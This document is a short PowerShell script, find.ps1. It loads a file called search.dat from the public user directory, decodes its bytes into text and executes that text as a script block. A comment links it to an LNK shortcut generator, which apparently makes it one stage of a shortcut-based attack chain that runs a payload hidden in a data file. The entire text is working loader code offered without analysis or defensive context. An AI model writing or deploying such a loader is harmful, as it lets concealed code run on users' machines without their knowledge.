# find.ps1
# Invokes the script block from the search.dat file.
# Refer to the ../generate/lnkGenerator.ps1

# Assume that the find.ps1 and search.dat file is located in the $env:public directory.
$stringPath = Join-Path $env:public 'search.dat';
$stringByte = Get-Content -Path $stringPath -Encoding Byte
$string = [System.Text.Encoding]::UTF8.GetString($stringByte)
$scriptBlock = [ScriptBlock]::Create($string)
& $scriptBlock
